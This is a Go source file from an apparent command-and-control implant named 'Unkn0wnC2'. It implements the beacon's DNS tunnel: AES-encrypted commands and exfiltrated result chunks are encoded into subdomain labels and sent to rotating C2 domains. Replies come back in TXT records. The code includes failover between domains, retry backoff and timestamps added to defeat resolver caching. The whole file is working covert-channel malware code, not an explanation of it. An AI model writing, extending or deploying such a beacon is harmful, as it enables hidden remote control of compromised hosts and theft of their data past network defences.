// Package main implements DNS client functionality for the Unkn0wnC2 beacon.
// This handles DNS query construction, response parsing, and the core DNS
// communication protocol for C2 operations.
package main

import (
	"crypto/rand"
	"fmt"
	"math/big"
	"net"
	"strings"
	"sync"
	"time"
)

// DNSClient handles DNS-based C2 communication
type DNSClient struct {
	config        *Config
	aesKey        []byte
	domainIndex   int                  // For round-robin selection
	failedDomains map[string]time.Time // Tracks temporarily failed domains
	mutex         sync.RWMutex
}

// newDNSClient creates a DNS client with configured timeout and resolver settings
// for communicating with the C2 DNS server.
func newDNSClient() *DNSClient {
	config := getConfig()
	aesKey := generateAESKey(config.EncryptionKey)

	return &DNSClient{
		config:        &config,
		aesKey:        aesKey,
		domainIndex:   0,
		failedDomains: make(map[string]time.Time),
	}
}

// selectDomain chooses a domain based on the configured selection mode
// Each chunk can go to a different DNS server for distributed load balancing
// The chunk format contains taskID so Master can reassemble from any server
func (c *DNSClient) selectDomain(taskID string) (string, error) {
	domains := c.config.GetDomains()
	if len(domains) == 0 {
		return "", fmt.Errorf("no DNS domains configured")
	}

	// Single domain case - no selection needed
	if len(domains) == 1 {
		return domains[0], nil
	}

	// Clean up expired failed domains (retry after 5 minutes)
	c.mutex.Lock()
	now := time.Now()
	for domain, failTime := range c.failedDomains {
		if now.Sub(failTime) > 5*time.Minute {
			delete(c.failedDomains, domain)
		}
	}
	c.mutex.Unlock()

	// Filter out currently failed domains
	availableDomains := []string{}
	c.mutex.RLock()
	for _, domain := range domains {
		if _, failed := c.failedDomains[domain]; !failed {
			availableDomains = append(availableDomains, domain)
		}
	}
	c.mutex.RUnlock()

	// If all domains failed, reset and use all domains
	if len(availableDomains) == 0 {
		availableDomains = domains
		c.mutex.Lock()
		c.failedDomains = make(map[string]time.Time)
		c.mutex.Unlock()
	}

	var selectedDomain string
	mode := c.config.GetSelectionMode()

	switch mode {
	case "random":
		// Random selection for load balancing
		n, err := rand.Int(rand.Reader, big.NewInt(int64(len(availableDomains))))
		if err != nil {
			// Fallback to first domain if crypto/rand fails
			selectedDomain = availableDomains[0]
		} else {
			selectedDomain = availableDomains[n.Int64()]
		}

	case "round-robin":
		// Round-robin selection
		c.mutex.Lock()
		c.domainIndex = c.domainIndex % len(availableDomains)
		selectedDomain = availableDomains[c.domainIndex]
		c.domainIndex++
		c.mutex.Unlock()

	case "failover":
		// Failover: always use first available domain
		selectedDomain = availableDomains[0]

	default:
		// Default to random
		n, err := rand.Int(rand.Reader, big.NewInt(int64(len(availableDomains))))
		if err != nil {
			selectedDomain = availableDomains[0]
		} else {
			selectedDomain = availableDomains[n.Int64()]
		}
	}

	// NOTE: Task domain mapping removed to enable proper load balancing
	// Each chunk can go to a different DNS server for distributed processing
	// The chunk format (DATA|beaconID|taskID|chunkIndex|data) contains all
	// necessary metadata for the Master to reassemble results from any server

	return selectedDomain, nil
}

// markDomainFailed marks a domain as temporarily failed
func (c *DNSClient) markDomainFailed(domain string) {
	c.mutex.Lock()
	c.failedDomains[domain] = time.Now()
	c.mutex.Unlock()
}

// encodeCommand encrypts and encodes a command string for DNS transmission
func (c *DNSClient) encodeCommand(command string) (string, error) {
	encoded, err := encryptAndEncode(command, c.aesKey)
	if err != nil {
		return "", fmt.Errorf("failed to encrypt and encode command: %v", err)
	}
	return encoded, nil
}

// decodeResponse decodes and decrypts a DNS response back to readable format
func (c *DNSClient) decodeResponse(encoded string) (string, error) {
	decoded, err := decodeAndDecrypt(encoded, c.aesKey)
	if err != nil {
		return "", fmt.Errorf("failed to decode and decrypt response: %v", err)
	}
	return decoded, nil
}

// sendDNSQuery sends a command via DNS query with multi-domain support
// taskID parameter is used for metadata tracking but does NOT enforce domain affinity
// to allow proper load balancing across DNS servers
func (c *DNSClient) sendDNSQuery(command string, taskID string) (string, error) {
	encodedCmd, err := c.encodeCommand(command)
	if err != nil {
		return "", fmt.Errorf("failed to encode command: %v", err)
	}

	// Limit command length
	if len(encodedCmd) > c.config.MaxCommandLength {
		return "", fmt.Errorf("command too long: %d characters (max %d)", len(encodedCmd), c.config.MaxCommandLength)
	}

	// Select domain randomly for load balancing (no task affinity)
	domain, err := c.selectDomain("")
	if err != nil {
		return "", fmt.Errorf("failed to select domain: %v", err)
	}

	// Create DNS query with encoded command as subdomain
	// Split into 62-character chunks to comply with DNS label limits
	var labels []string
	for len(encodedCmd) > 0 {
		chunkSize := len(encodedCmd)
		if chunkSize > 62 {
			chunkSize = 62
		}
		labels = append(labels, encodedCmd[:chunkSize])
		encodedCmd = encodedCmd[chunkSize:]
	}

	queryName := fmt.Sprintf("%s.%s", strings.Join(labels, "."), domain)

	var result string

	// Use standard library DNS resolution only (simplified)
	for attempt := 0; attempt < c.config.RetryAttempts; attempt++ {
		switch c.config.QueryType {
		case "TXT":
			txtRecords, lookupErr := net.LookupTXT(queryName)
			if lookupErr == nil && len(txtRecords) > 0 {
				// Try to decode TXT records
				for _, txt := range txtRecords {
					decoded, decErr := c.decodeResponse(txt)
					if decErr == nil {
						result = decoded
					} else {
						result = fmt.Sprintf("Raw TXT: %s", txt)
					}
					break
				}
				err = nil
				break
			}
			err = lookupErr

		default:
			addrs, lookupErr := net.LookupHost(queryName)
			if lookupErr == nil && len(addrs) > 0 {
				result = fmt.Sprintf("DNS Response IPs: %v", addrs)
				err = nil
				break
			}
			err = lookupErr
		}

		if err == nil {
			break
		}

		// Adaptive backoff - longer delays for repeated failures
		if attempt < c.config.RetryAttempts-1 {
			backoffDelay := time.Duration((attempt+1)*(attempt+1)) * time.Second // 1s, 4s, 9s
			if backoffDelay > 10*time.Second {
				backoffDelay = 10 * time.Second // Cap at 10s
			}
			time.Sleep(backoffDelay)
		}
	}

	// If all retries failed, mark domain as failed and try another domain
	if err != nil {
		c.markDomainFailed(domain)

		// Try one more time with a different domain (failover)
		domains := c.config.GetDomains()
		if len(domains) > 1 {
			// Select a different domain (don't pass taskID to allow selection of different domain)
			newDomain, selErr := c.selectDomain("")
			if selErr == nil && newDomain != domain {
				// Recursive call with new domain (limit recursion by checking domain change)
				return c.sendDNSQuery(command, taskID)
			}
		}

		return "", fmt.Errorf("DNS query to %s failed after %d attempts: %v", domain, c.config.RetryAttempts, err)
	}

	return result, nil
}

// sendCommand is the main interface for sending commands
func (c *DNSClient) sendCommand(command string) (string, error) {
	if strings.TrimSpace(command) == "" {
		return "", fmt.Errorf("empty command")
	}

	// Add timestamp to command to bypass DNS caching on recursive resolvers
	timestamp := fmt.Sprintf("%d", time.Now().Unix())
	commandWithTimestamp := fmt.Sprintf("%s|%s", command, timestamp)

	// Extract taskID from command for metadata tracking (not for domain affinity)
	// Format: RESULT|beaconID|taskID|data
	// Format: RESULT_META|beaconID|taskID|totalSize|totalChunks
	// Format: DATA|beaconID|taskID|chunkIndex|data
	taskID := ""
	parts := strings.Split(command, "|")
	if len(parts) >= 3 {
		cmdType := parts[0]
		if cmdType == "RESULT" || cmdType == "RESULT_META" || cmdType == "DATA" {
			taskID = parts[2] // taskID is always the 3rd field for these commands
		}
	}

	result, err := c.sendDNSQuery(commandWithTimestamp, taskID)

	return result, err
}
